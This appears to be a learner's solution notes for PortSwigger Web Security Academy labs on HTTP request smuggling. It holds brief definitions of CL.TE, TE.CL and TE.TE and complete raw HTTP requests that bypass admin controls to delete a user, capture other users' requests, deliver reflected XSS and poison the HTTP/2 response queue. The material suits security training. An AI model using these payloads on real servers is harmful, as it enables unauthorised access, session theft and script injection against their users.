## Definitions

CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.

TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.


## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```
POST / HTTP/1.1
Host: 0aa7008c03b9924b82368eae00f1000b.web-security-academy.net
Cookie: session=SAtYYg4IbuJtFGLS7ZCkKCFSEFBE9QcT
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa7008c03b9924b82368eae00f1000b.web-security-academy.net/post?postId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Content-Length: 35
Transfer-Encoding: chunked
Priority: u=0, i

0

GET /404 HTTP/1.1
X-Ignore: x
```


## 2. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```
POST / HTTP/1.1
Host: 0a4c0045043a879a808d8599002b000d.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked

2d
POST /404 HTTP/1.1
Content-Length: 15

x=1
0


```


## 3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```
POST / HTTP/1.1
Host: 0a330015044adcb4815ca7f300d40042.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Length: 93
TRansfer-EnCoding: chunked

0

GET /admin/delete HTTP/1.1
Host: localhost
Content-Length: 28

username=carlos&foo=s
```


## 4. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```
POST / HTTP/1.1
Host: 0a1000530341f12d8006496700b30072.web-security-academy.net
Cookie: session=jzlllaMYVKfuiRs7br1Fp1MO0EcqpTdV
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acb00cd0459d7fb82e851f100150013.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked

87
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0


```


## 5. Exploiting HTTP request smuggling to reveal front-end request rewriting

Reveal header

```
POST / HTTP/1.1
Host: 0ab6003503cb31798294832200580042.web-security-academy.net
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
tRANSFER-ENCODING: chunked

0

POST / HTTP/1.1
Host: 0ab6003503cb31798294832200580042.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

Removing user

```
POST / HTTP/1.1
Host: 0ab6003503cb31798294832200580042.web-security-academy.net
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
tRANSFER-ENCODING: chunked

0

GET /admin/delete HTTP/1.1
Host: localhost
X-GxMLiC-Ip: 127.0.0.1
Content-Length: 100

username=carlos&foo=
```


## 6. Exploiting HTTP request smuggling to capture other users' requests

```
POST / HTTP/1.1
Host: 0a8f00f1035fd66080b74e1b00080033.web-security-academy.net
Cookie: session=IqUtmyCxYCeG1sdYuqjDdh24ElWbMGj3
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Transfer-Encoding: chunked
Content-Length: 318

0

POST /post/comment HTTP/1.1
Host: 0a8f00f1035fd66080b74e1b00080033.web-security-academy.net
Cookie: session=IqUtmyCxYCeG1sdYuqjDdh24ElWbMGj3
Content-Length: 900
Content-Type: application/x-www-form-urlencoded

csrf=gv1YbxY0S87uLQ89rqDIv808FlfhyumG&postId=1&name=212&website=&email=some%40some.com&comment=aa
```


## 7. Exploiting HTTP request smuggling to deliver reflected XSS

```
POST / HTTP/1.1
Host: 0a1500dc04b3b824840de05400c70077.web-security-academy.net
Cookie: session=FludtEsvJ5SjO2VwuVGqXUc45XX6OJhO
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1500dc04b3b824840de05400c70077.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Transfer-Encoding: chunked
Content-Length: 192

0

GET /post?postId=3 HTTP/1.1
Host: 0a1500dc04b3b824840de05400c70077.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"><script>alert(1)</script>
X-Ignore: x
```


## 8. Response queue poisoning via H2.TE request smuggling

```
POST /x HTTP/2
Host: 0a49009204d8f8c482f30c6600990071.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: 0a49009204d8f8c482f30c6600990071.web-security-academy.net


```

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a49009204d8f8c482f30c6600990071.web-security-academy.net
Cookie: session=G8RNXMz3NcxmfRfhvp6PZRdZn9YVzyIh
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i


```



## 13. HTTP request smuggling, basic CL.TE vulnerability

```
POST / HTTP/1.1
Host: 0a4500c504c9b38882c39e5e001d0002.web-security-academy.net
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Length: 34
TRansfer-EnCoding: chunked
Connection: close

0

GPOST / HTTP/1.1
X-Ignore: X
```
